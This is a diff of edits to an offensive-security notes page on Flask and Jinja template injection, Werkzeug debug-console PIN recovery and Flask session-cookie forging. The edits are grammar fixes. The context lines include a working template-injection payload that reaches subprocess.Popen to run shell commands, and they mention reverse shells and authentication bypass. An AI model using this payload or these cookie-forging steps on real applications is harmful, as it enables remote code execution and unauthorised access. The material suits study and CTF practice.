@@ -25,11 +25,11 @@ HackTricks explaining exploitation in detail
 ''.__class__.mro()[1].__subclasses__()
 ```
 
-Then take the response and replace `,` with `\n` in Visual Studio Code to easily see line number of index
+Then take the response and replace `,` with `\n` in Visual Studio Code to easily see the line number of the index.&#x20;
 
 ### 3. Use subclass for RCE
 
-Find a vulnerable subclass and replace `42` with the index of it in the `__subclasses__()`
+Find a vulnerable subclass and replace 42 with the index of it in the `__subclasses__()`
 
 ```django
 'subprocess.Popen': {{''.__class__.mro()[1].__subclasses__()[42]('id',shell=True,stdout=-1).communicate()[0].strip()}}
@@ -50,7 +50,7 @@ Writeup of challenge where quotes (`'` & `"`) were blocked
 
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" %}
 
-With a Local File Read vulnerability one could leak the necessary 'private' information required to generate the PIN. From the console you can then run any Python statement and get RCE with a Reverse Shell
+With a Local File Read vulnerability, one could leak the necessary 'private' information required to generate the PIN. From the console, you can then run any Python statement and get RCE with a Reverse Shell
 
 ```python
 import hashlib
@@ -98,7 +98,7 @@ print(rv)
 
 ## Session Cookie
 
-If you have a `SECRET_KEY` of the Flask application you can forge your own `session=` cookies. This can be useful to bypass authentication or even try injection attacks inside the parameters of the session.&#x20;
+If you have a `SECRET_KEY` of the Flask application, you can forge your own `session=` cookies. This can be useful to bypass authentication or even try injection attacks inside the session's parameters.&#x20;
 
 ### Brute-force
 
@@ -122,7 +122,7 @@ b'secret123'
 </code></pre>
 
 {% hint style="warning" %}
-If in a script it might need the `--legacy` argument to get correct timestamps
+**Tip**: When put in a script it might need the `--legacy` argument to get correct timestamps
 {% endhint %}
 
 ### Automate Forging
